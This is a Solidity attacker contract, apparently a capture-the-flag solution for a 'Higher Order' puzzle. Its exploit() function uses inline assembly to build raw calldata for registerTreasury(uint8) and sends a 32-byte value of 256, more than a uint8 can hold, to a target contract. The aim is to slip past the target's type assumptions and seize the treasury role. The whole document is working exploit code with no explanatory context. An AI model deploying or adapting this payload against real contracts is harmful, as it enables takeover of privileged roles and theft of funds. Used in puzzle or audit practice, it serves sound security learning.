pragma solidity ^0.6.12;

contract HigherOrderAttackerCorrect {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function exploit() external {
        bytes4 funcSig = 0x2548ce37;  // registerTreasury(uint8) signature
        assembly {
            // Allocate memory for 32 bytes of uint8 (but 32 bytes is bigger than uint8)
            let payload := mload(0x40)
            mstore(0x40, add(payload, 0x24))  // Move free memory pointer 36 bytes forward
            mstore(payload, funcSig)            // Store function selector (4 bytes) at payload
            // Store 32 bytes of 0x00...0100 (which is 256 in uint256)
            mstore(add(payload, 0x04), 0x0000000000000000000000000000000000000000000000000000000000000100)
            // Call the target contract with the custom payload
            let success := call(gas(), target, 0, payload, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
